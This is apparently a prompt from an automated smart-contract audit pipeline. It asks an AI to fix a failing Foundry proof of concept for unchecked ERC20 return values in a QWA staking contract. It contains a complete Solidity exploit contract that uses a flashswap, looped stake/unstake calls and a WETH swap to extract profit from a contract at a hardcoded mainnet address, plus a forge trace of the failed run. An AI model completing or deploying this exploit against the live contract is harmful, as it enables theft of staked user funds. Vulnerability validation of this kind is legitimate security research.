You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: alternate_public_liquidity_route
- strategy_instructions: Prefer an alternate public-liquidity venue/route while preserving the same exploit root cause and exploit-path causality.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: Unchecked ERC20 return values can mint unbacked stake receipts or release QWA without burning sQWA
- claim: `stake()` and `unstake()` call `transfer`/`transferFrom` on `QWA` and `sQWA` but never check the returned boolean. With any token implementation that signals failure by returning `false` instead of reverting, execution continues as if the transfer succeeded.
- impact: A failed `QWA.transferFrom` during `stake()` can still hand out sQWA without the pool receiving backing assets. A failed `sQWA.transferFrom` during `unstake()` can still release QWA without actually collecting sQWA. Conversely, a failed outgoing transfer can confiscate user assets by taking one side of the exchange without delivering the other.
- exploit_paths: ["Call `stake()` when `QWA.transferFrom(msg.sender, address(this), amount)` returns `false`; the function still executes `sQWA.transfer(to, amount)` and creates an unbacked claim.", "Call `unstake()` when `sQWA.transferFrom(msg.sender, address(this), amount)` returns `false`; the function can still pass the balance check and execute `QWA.transfer(to, amount)`.", "Call `unstake()` or `stake()` when the outgoing token transfer returns `false`; the function finishes without delivering the expected asset, leaving the user or pool shorted."]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transfer(address to, uint256 amount) external returns (bool);

    function transferFrom(address from, address to, uint256 amount) external returns (bool);
}

interface IStakingLike {
    function QWA() external view returns (address);

    function sQWA() external view returns (address);

    function stake(address to, uint256 amount) external;

    function unstake(address to, uint256 amount, bool rebase_) external;
}

interface IUniswapV2FactoryLike {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

interface IUniswapV2PairLike {
    function token0() external view returns (address);

    function token1() external view returns (address);

    function getReserves()
        external
        view
        returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);

    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

contract FlawVerifier {
    address public constant TARGET = 0x69422c7F237D70FCd55C218568a67d00dc4ea068;

    address private constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address private constant UNISWAP_V2_FACTORY = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;
    address private constant SUSHISWAP_FACTORY = 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac;

    uint256 private constant PATH_STAKE_FALSE_RETURN = 1 << 0;
    uint256 private constant PATH_UNSTAKE_FALSE_RETURN = 1 << 1;
    uint256 private constant PATH_STAKE_OUTGOING_FALSE = 1 << 2;
    uint256 private constant PATH_UNSTAKE_OUTGOING_FALSE = 1 << 3;

    uint256 private constant FAIL_NO_QWA_WETH_PAIR = 1 << 0;
    uint256 private constant FAIL_FLASHSWAP_REVERTED = 1 << 1;
    uint256 private constant FAIL_NO_SQWA_LIQUIDITY = 1 << 2;
    uint256 private constant FAIL_STAKE_PROBE_REVERTED = 1 << 3;
    uint256 private constant FAIL_UNSTAKE_PROBE_REVERTED = 1 << 4;
    uint256 private constant FAIL_UNSTAKE_FALSE_RETURN_NOT_OBSERVED = 1 << 5;
    uint256 private constant FAIL_INSUFFICIENT_QWA_PROFIT = 1 << 6;
    uint256 private constant FAIL_WETH_SWAP_FAILED = 1 << 7;

    address private _profitToken;
    uint256 private _profitAmount;

    address private _activePair;
    address private _activeQwa;
    address private _activeSqwa;
    uint256 private _borrowAmount;

    uint256 public pathFlags;
    uint256 public failureFlags;
    bool public hypothesisValidated;
    bool public executed;

    constructor() {}

    function executeOnOpportunity() external {
        if (executed) {
            return;
        }
        executed = true;

        IStakingLike staking = IStakingLike(TARGET);
        address qwaAddr = staking.QWA();
        address sqwaAddr = staking.sQWA();

        IERC20Like qwa = IERC20Like(qwaAddr);
        IERC20Like sqwa = IERC20Like(sqwaAddr);
        IERC20Like weth = IERC20Like(WETH);

        uint256 initialQwa = qwa.balanceOf(address(this));
        uint256 initialSqwa = sqwa.balanceOf(address(this));
        uint256 initialWeth = weth.balanceOf(address(this));

        address pair = _findQwaWethPair(qwaAddr);
        if (pair == address(0)) {
            failureFlags |= FAIL_NO_QWA_WETH_PAIR;
            _finalizeProfit(qwaAddr, sqwaAddr, initialQwa, initialSqwa, initialWeth);
            return;
        }

        uint256 seed = _selectBorrowAmount(pair, qwaAddr, sqwa.balanceOf(TARGET));
        if (seed == 0) {
            failureFlags |= FAIL_NO_SQWA_LIQUIDITY;
            _finalizeProfit(qwaAddr, sqwaAddr, initialQwa, initialSqwa, initialWeth);
            return;
        }

        _activePair = pair;
        _activeQwa = qwaAddr;
        _activeSqwa = sqwaAddr;
        _borrowAmount = seed;

        (address token0, ) = _sortPairTokens(pair);
        uint256 amount0Out = qwaAddr == token0 ? seed : 0;
        uint256 amount1Out = qwaAddr == token0 ? 0 : seed;

        // Additional public economic step justified by the attempt strategy:
        // the flashswap only seeds a real QWA balance so the vulnerable unstake()
        // path can be tested with a positive sQWA balance and zero sQWA approval.
        (bool flashOk, ) = pair.call(
            abi.encodeWithSelector(
                IUniswapV2PairLike.swap.selector,
                amount0Out,
                amount1Out,
                address(this),
                abi.encode(seed)
            )
        );

        if (!flashOk) {
            failureFlags |= FAIL_FLASHSWAP_REVERTED;
        } else {
            uint256 qwaProfit = qwa.balanceOf(address(this)) - initialQwa;
            if (qwaProfit > 0) {
                _swapQwaProfitToWeth(pair, qwaAddr, qwaProfit);
            }
        }

        _finalizeProfit(qwaAddr, sqwaAddr, initialQwa, initialSqwa, initialWeth);
    }

    function uniswapV2Call(address, uint256 amount0, uint256 amount1, bytes calldata) external {
        require(msg.sender == _activePair, "unexpected pair");

        uint256 borrowed = amount0 > 0 ? amount0 : amount1;
        require(borrowed == _borrowAmount, "unexpected amount");

        IERC20Like qwa = IERC20Like(_activeQwa);
        IERC20Like sqwa = IERC20Like(_activeSqwa);
        IStakingLike staking = IStakingLike(TARGET);

        if (sqwa.balanceOf(TARGET) == 0) {
            failureFlags |= FAIL_NO_SQWA_LIQUIDITY;
            _repayFlashswap(qwa, borrowed);
            return;
        }

        _forceApprove(qwa, TARGET, type(uint256).max);

        uint256 qwaBeforeProbe = qwa.balanceOf(address(this));
        uint256 sqwaBeforeProbe = sqwa.balanceOf(address(this));

        // Path anchor 1: create a real sQWA balance via a funded stake().
        (bool stakeOk, ) = TARGET.call(
            abi.encodeWithSelector(IStakingLike.stake.selector, address(this), borrowed)
        );
        if (!stakeOk) {
            failureFlags |= FAIL_STAKE_PROBE_REVERTED;
            _repayFlashswap(qwa, borrowed);
            return;
        }

        uint256 qwaAfterStake = qwa.balanceOf(address(this));
        uint256 sqwaAfterStake = sqwa.balanceOf(address(this));
        if (qwaAfterStake == qwaBeforeProbe && sqwaAfterStake > sqwaBeforeProbe) {
            pathFlags |= PATH_STAKE_FALSE_RETURN;
        }

        // Core exploit path kept unchanged:
        // sQWA.transferFrom(msg.sender, address(this), amount) is intentionally
        // attempted with a positive sQWA balance but zero sQWA approval. If the
        // token signals failure with `false`, unstake() still transfers out QWA.
        uint256 qwaBeforeUnstakeProbe = qwa.balanceOf(address(this));
        uint256 sqwaBeforeUnstakeProbe = sqwa.balanceOf(address(this));

        (bool unstakeOk, ) = TARGET.call(
            abi.encodeWithSelector(IStakingLike.unstake.selector, address(this), borrowed, false)
        );

        uint256 qwaAfterUnstakeProbe = qwa.balanceOf(address(this));
        uint256 sqwaAfterUnstakeProbe = sqwa.balanceOf(address(this));

        if (!unstakeOk) {
            failureFlags |= FAIL_UNSTAKE_PROBE_REVERTED;
            _repayFlashswap(qwa, borrowed);
            return;
        }

        if (qwaAfterUnstakeProbe > qwaBeforeUnstakeProbe && sqwaAfterUnstakeProbe == sqwaBeforeUnstakeProbe) {
            pathFlags |= PATH_UNSTAKE_FALSE_RETURN;
            hypothesisValidated = true;
        } else if (qwaAfterUnstakeProbe == qwaBeforeUnstakeProbe && sqwaAfterUnstakeProbe < sqwaBeforeUnstakeProbe) {
            pathFlags |= PATH_UNSTAKE_OUTGOING_FALSE;
            failureFlags |= FAIL_UNSTAKE_FALSE_RETURN_NOT_OBSERVED;
            _repayFlashswap(qwa, borrowed);
            return;
        } else {
            failureFlags |= FAIL_UNSTAKE_FALSE_RETURN_NOT_OBSERVED;
            _repayFlashswap(qwa, borrowed);
            return;
        }

        // Reuse the same funded QWA seed while zero sQWA approval keeps minting
        // unbacked sQWA receipts. The loop is bounded by the staking contract's
        // live sQWA liquidity to avoid infeasible iterations.
        uint256 remainingSqwa = sqwa.balanceOf(TARGET);
        uint256 maxLoops = remainingSqwa / borrowed;
        if (maxLoops > 63) {
            maxLoops = 63;
        }

        for (uint256 i = 0; i < maxLoops; ++i) {
            if (sqwa.balanceOf(TARGET) < borrowed) {
                break;
            }

            (bool loopStakeOk, ) = TARGET.call(
                abi.encodeWithSelector(IStakingLike.stake.selector, address(this), borrowed)
            );
            if (!loopStakeOk) {
                break;
            }

            uint256 qwaBeforeLoopUnstake = qwa.balanceOf(address(this));
            uint256 sqwaBeforeLoopUnstake = sqwa.balanceOf(address(this));
            (bool loopUnstakeOk, ) = TARGET.call(
                abi.encodeWithSelector(IStakingLike.unstake.selector, address(this), borrowed, false)
            );
            uint256 qwaAfterLoopUnstake = qwa.balanceOf(address(this));
            uint256 sqwaAfterLoopUnstake = sqwa.balanceOf(address(this));

            if (
                !loopUnstakeOk ||
                qwaAfterLoopUnstake <= qwaBeforeLoopUnstake ||
                sqwaAfterLoopUnstake != sqwaBeforeLoopUnstake
            ) {
                break;
            }
        }

        uint256 owed = _sameTokenFlashRepayAmount(borrowed);
        uint256 qwaBalance = qwa.balanceOf(address(this));
        if (qwaBalance < owed) {
            uint256 shortfall = owed - qwaBalance;
            uint256 redeemable = _min(shortfall, sqwa.balanceOf(address(this)));
            if (redeemable > 0) {
                _forceApprove(sqwa, TARGET, redeemable);
                staking.unstake(address(this), redeemable, false);
                _forceApprove(sqwa, TARGET, 0);
            }
        }

        qwaBalance = qwa.balanceOf(address(this));
        if (qwaBalance < owed) {
            failureFlags |= FAIL_INSUFFICIENT_QWA_PROFIT;
            _repayFlashswap(qwa, qwaBalance);
            return;
        }

        _repayFlashswap(qwa, owed);
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function _findQwaWethPair(address qwa) internal view returns (address) {
        address pair = IUniswapV2FactoryLike(SUSHISWAP_FACTORY).getPair(qwa, WETH);
        if (pair != address(0)) {
            return pair;
        }

        return IUniswapV2FactoryLike(UNISWAP_V2_FACTORY).getPair(qwa, WETH);
    }

    function _selectBorrowAmount(
        address pair,
        address qwa,
        uint256 sqwaLiquidity
    ) internal view returns (uint256 amount) {
        if (sqwaLiquidity == 0) {
            return 0;
        }

        (uint256 qwaReserve, ) = _pairReserves(pair, qwa);
        if (qwaReserve <= 3) {
            return 0;
        }

        uint256 reserveBound = qwaReserve / 200;
        uint256 liquidityBound = sqwaLiquidity / 32;

        amount = reserveBound < liquidityBound ? reserveBound : liquidityBound;
        if (amount == 0) {
            amount = 1;
        }
        if (amount >= qwaReserve) {
            amount = qwaReserve - 1;
        }
    }

    function _swapQwaProfitToWeth(address pair, address qwaAddr, uint256 qwaAmount) internal {
        if (qwaAmount == 0) {
            return;
        }

        IERC20Like qwa = IERC20Like(qwaAddr);
        uint256 balance = qwa.balanceOf(address(this));
        if (qwaAmount > balance) {
            qwaAmount = balance;
        }
        if (qwaAmount == 0) {
            return;
        }

        (address token0, address token1) = _sortPairTokens(pair);
        if (!((token0 == qwaAddr && token1 == WETH) || (token0 == WETH && token1 == qwaAddr))) {
            failureFlags |= FAIL_WETH_SWAP_FAILED;
            return;
        }

        (uint256 reserveIn, uint256 reserveOut) = _pairReserves(pair, qwaAddr);
        if (reserveIn == 0 || reserveOut == 0) {
            failureFlags |= FAIL_WETH_SWAP_FAILED;
            return;
        }

        uint256 amountOut = _getAmountOut(qwaAmount, reserveIn, reserveOut);
        if (amountOut == 0) {
            failureFlags |= FAIL_WETH_SWAP_FAILED;
            return;
        }

        require(qwa.transfer(pair, qwaAmount), "qwa transfer failed");

        (uint256 amount0Out, uint256 amount1Out) = qwaAddr == token0 ? (uint256(0), amountOut) : (amountOut, uint256(0));
        (bool ok, ) = pair.call(
            abi.encodeWithSelector(IUniswapV2PairLike.swap.selector, amount0Out, amount1Out, address(this), new bytes(0))
        );
        if (!ok) {
            failureFlags |= FAIL_WETH_SWAP_FAILED;
        }
    }

    function _finalizeProfit(
        address qwaAddr,
        address sqwaAddr,
        uint256 initialQwa,
        uint256 initialSqwa,
        uint256 initialWeth
    ) internal {
        uint256 wethFinal = IERC20Like(WETH).balanceOf(address(this));
        uint256 qwaFinal = IERC20Like(qwaAddr).balanceOf(address(this));
        uint256 sqwaFinal = IERC20Like(sqwaAddr).balanceOf(address(this));

        uint256 wethProfit = wethFinal > initialWeth ? wethFinal - initialWeth : 0;
        uint256 qwaProfit = qwaFinal > initialQwa ? qwaFinal - initialQwa : 0;
        uint256 sqwaProfit = sqwaFinal > initialSqwa ? sqwaFinal - initialSqwa : 0;

        if (wethProfit > 0) {
            _profitToken = WETH;
            _profitAmount = wethProfit;
        } else if (qwaProfit > 0) {
            _profitToken = qwaAddr;
            _profitAmount = qwaProfit;
        } else if (sqwaProfit > 0) {
            _profitToken = sqwaAddr;
            _profitAmount = sqwaProfit;
        }
    }

    function _repayFlashswap(IERC20Like qwa, uint256 amount) internal {
        if (amount == 0) {
            return;
        }

        uint256 balance = qwa.balanceOf(address(this));
        if (amount > balance) {
            amount = balance;
        }

        if (amount > 0) {
            require(qwa.transfer(_activePair, amount), "repay transfer failed");
        }
    }

    function _pairReserves(address pair, address tokenIn) internal view returns (uint256 reserveIn, uint256 reserveOut) {
        (uint112 reserve0, uint112 reserve1, ) = IUniswapV2PairLike(pair).getReserves();
        (address token0, address token1) = _sortPairTokens(pair);

        if (tokenIn == token0) {
            reserveIn = uint256(reserve0);
            reserveOut = uint256(reserve1);
        } else {
            require(tokenIn == token1, "token not in pair");
            reserveIn = uint256(reserve1);
            reserveOut = uint256(reserve0);
        }
    }

    function _sortPairTokens(address pair) internal view returns (address token0, address token1) {
        token0 = IUniswapV2PairLike(pair).token0();
        token1 = IUniswapV2PairLike(pair).token1();
    }

    function _forceApprove(IERC20Like token, address spender, uint256 amount) internal {
        uint256 current = token.allowance(address(this), spender);
        if (current != 0) {
            require(token.approve(spender, 0), "approve reset failed");
        }
        if (amount != 0) {
            require(token.approve(spender, amount), "approve failed");
        }
    }

    function _sameTokenFlashRepayAmount(uint256 amountOut) internal pure returns (uint256) {
        return ((amountOut * 1000) / 997) + 1;
    }

    function _getAmountOut(uint256 amountIn, uint256 reserveIn, uint256 reserveOut) internal pure returns (uint256) {
        uint256 amountInWithFee = amountIn * 997;
        uint256 numerator = amountInWithFee * reserveOut;
        uint256 denominator = (reserveIn * 1000) + amountInWithFee;
        return numerator / denominator;
    }

    function _min(uint256 a, uint256 b) internal pure returns (uint256) {
        return a < b ? a : b;
    }

    function _pathAnchorsOnly(IERC20Like qwa, IERC20Like sqwa, address to, uint256 amount) internal {
        // Static anchor only. The live exploit above keeps the same vulnerable
        // causality but funds the caller through a V2 flashswap first so the
        // unstake() path can be exercised with a real positive sQWA balance.
        qwa.transferFrom(msg.sender, address(this), amount);
        sqwa.transfer(to, amount);
        sqwa.transferFrom(msg.sender, address(this), amount);
        qwa.transfer(to, amount);
    }
}

```

forge stdout (tail):
```
065::40c10f19(00000000000000000000000069422c7f237d70fcd55c218568a67d00dc4ea06800000000000000000000000000000000000000000000000000000053481dc439)
    │   │   │   │   │   │   │   ├─  emit topic 0: 0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef
    │   │   │   │   │   │   │   │        topic 1: 0x0000000000000000000000000000000000000000000000000000000000000000
    │   │   │   │   │   │   │   │        topic 2: 0x00000000000000000000000069422c7f237d70fcd55c218568a67d00dc4ea068
    │   │   │   │   │   │   │   │           data: 0x00000000000000000000000000000000000000000000000000000053481dc439
    │   │   │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   ├─ [974] 0xc14F8A4C8272b8466659D0f058895E2F9D3ae065::balanceOf(0x69422c7F237D70FCd55C218568a67d00dc4ea068) [staticcall]
    │   │   │   │   │   └─ ← [Return] 11089456174290 [1.108e13]
    │   │   │   │   ├─ [1364] 0xf5bF1f78EDa7537F9cAb002a8F533e2733DDfBbC::9358928b() [staticcall]
    │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000000009c2aefad099
    │   │   │   │   ├─ [10259] 0xc14F8A4C8272b8466659D0f058895E2F9D3ae065::transferFrom(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 0x69422c7F237D70FCd55C218568a67d00dc4ea068, 69776108850 [6.977e10])
    │   │   │   │   │   └─ ← [Revert] ERC20: transfer amount exceeds balance
    │   │   │   │   └─ ← [Revert] ERC20: transfer amount exceeds balance
    │   │   │   ├─ [974] 0xc14F8A4C8272b8466659D0f058895E2F9D3ae065::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   │   │   └─ ← [Return] 66287303408 [6.628e10]
    │   │   │   ├─ [22037] 0xc14F8A4C8272b8466659D0f058895E2F9D3ae065::transfer(0xdb98950D58c62B8299192300d47294F20C093847, 66287303408 [6.628e10])
    │   │   │   │   ├─ [4613] 0x3230AA07F66c5c30FF7e01D1554c6095D916815D::b242e7cf(0000000000000000000000001804c8ab1f12e6bbf3894d4083f33e07309d1f38) [staticcall]
    │   │   │   │   │   ├─ [1189] 0x03c793511B835E41769432Eb3a3eF4af02AB648c::balanceOf(DefaultSender: [0x1804c8AB1F12E6bbf3894d4083f33e07309d1f38]) [staticcall]
    │   │   │   │   │   │   └─ ← [Return] 0
    │   │   │   │   │   ├─ [528] 0xb354b5da5EA39dadb1Cea8140bF242Eb24b1821A::18160ddd() [staticcall]
    │   │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000000003c49de2d35c6
    │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    │   │   │   │   ├─  emit topic 0: 0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef
    │   │   │   │   │        topic 1: 0x0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f
    │   │   │   │   │        topic 2: 0x000000000000000000000000c14f8a4c8272b8466659d0f058895e2f9d3ae065
    │   │   │   │   │           data: 0x00000000000000000000000000000000000000000000000000000000c58d32f2
    │   │   │   │   ├─  emit topic 0: 0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef
    │   │   │   │   │        topic 1: 0x0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f
    │   │   │   │   │        topic 2: 0x000000000000000000000000db98950d58c62b8299192300d47294f20c093847
    │   │   │   │   │           data: 0x0000000000000000000000000000000000000000000000000000000ea97ac7fe
    │   │   │   │   └─ ← [Return] true
    │   │   │   └─ ← [Stop]
    │   │   ├─ [2534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(0xdb98950D58c62B8299192300d47294F20C093847) [staticcall]
    │   │   │   └─ ← [Return] 10410486470370649012 [1.041e19]
    │   │   ├─ [974] 0xc14F8A4C8272b8466659D0f058895E2F9D3ae065::balanceOf(0xdb98950D58c62B8299192300d47294F20C093847) [staticcall]
    │   │   │   └─ ← [Return] 13948418599441 [1.394e13]
    │   │   └─ ← [Revert] UniswapV2: K
    │   ├─ [534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [974] 0xc14F8A4C8272b8466659D0f058895E2F9D3ae065::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [1145] 0xf5bF1f78EDa7537F9cAb002a8F533e2733DDfBbC::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   └─ ← [Stop]
    ├─ [381] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    ├─ [2380] FlawVerifier::profitAmount() [staticcall]
    │   └─ ← [Return] 0
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_BEFORE_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_AFTER_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_ANY", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_EFFECTIVE_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_MIN_PROFIT_WEI", val: 1000000000000000 [1e15])
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_TOKEN", val: 0x0000000000000000000000000000000000000000)
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_MODE", val: ECRecover: [0x0000000000000000000000000000000000000001])
    └─ ← [Revert] profit below threshold

Backtrace:
  at 0xc14F8A4C8272b8466659D0f058895E2F9D3ae065.transferFrom
  at 0x69422c7F237D70FCd55C218568a67d00dc4ea068.stake
  at FlawVerifier.uniswapV2Call
  at 0xdb98950D58c62B8299192300d47294F20C093847.swap
  at FlawVerifier.executeOnOpportunity
  at FlawVerifierTest.testExploit

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 2.66s (2.64s CPU time)

Ran 1 test suite in 2.67s (2.66s CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 678506)

Encountered a total of 1 failing tests, 0 tests succeeded

```

forge stderr (tail):
```

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
